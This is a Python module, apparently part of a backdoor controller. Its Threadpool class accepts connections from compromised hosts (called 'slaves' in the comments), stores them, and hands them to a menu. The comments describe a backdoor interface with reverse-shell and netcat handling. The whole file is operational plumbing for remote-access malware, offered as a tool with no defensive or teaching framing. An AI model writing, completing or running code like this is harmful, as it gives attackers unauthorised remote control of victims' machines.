from threading import Thread
from queue import Queue
from time import sleep
from sys import exit
# lib
from .menu import Menu
from .cli import CLI
from .connection import Connection

class Threadpool():
    # create thead_pool and for each tread run connection to wait for connection
    # store cons and addrs arrays
    # slaves[(conn, (ip_addr, port))]
    # job1 is backdoor interface including revshell, job 2 keeps connections
    # when job1 finishes try to grab another connection and give it to user, in case of revshell on quit netcat
    # revshell should put connection back to cons lists and go back to main menu and wait to exit netcat
    # need main menu to list connections, connect to client and exit
    # exit shell shout put connection back to cons list and go back to main menu

    def __init__(self):
        self.ip_addr, self.port, self.shell_port = self.get_cli_args()

        self.queue = Queue()

        self.threads = 2
        self.jobs = self.build_jobs()

        self.cons = []
        self.addrs = []

    def get_cli_args(self):
        cli = CLI()
        ip_addr, port, shell_port = cli.return_configs()
        return ip_addr, port, shell_port
        
    def build_jobs(self):
        jobs = []
        for i in range(1, self.threads+1):
            jobs.append(i)
        return jobs

    def create_jobs(self):
        for thread_id in self.jobs:
            self.queue.put(thread_id)
        self.queue.join()

    def create_threads(self):
        for _ in range(self.threads):
            threadObj = Thread(target=self.work)
            threadObj.daemon = True
            threadObj.start()
        self.queue.join()

    def work(self):
        while True:
            id = self.queue.get()
            if id == 1:
                connection = Connection(self.ip_addr, self.port)
                conn, addr = connection.connect()
                self.cons.append(conn)
                self.addrs.append(addr)
            elif id == 2:
                while True:
                    sleep(0.2)
                    if len(self.addrs) > 0:
                        menu = Menu(self.cons, self.addrs, self.ip_addr, self.port, self.shell_port)
                        menu.main_menu()
                        break
            #self.queue.task_done()
            self.queue.task_done()
            exit(0)

    def run_app(self):
        self.create_threads()
        self.create_jobs()
        




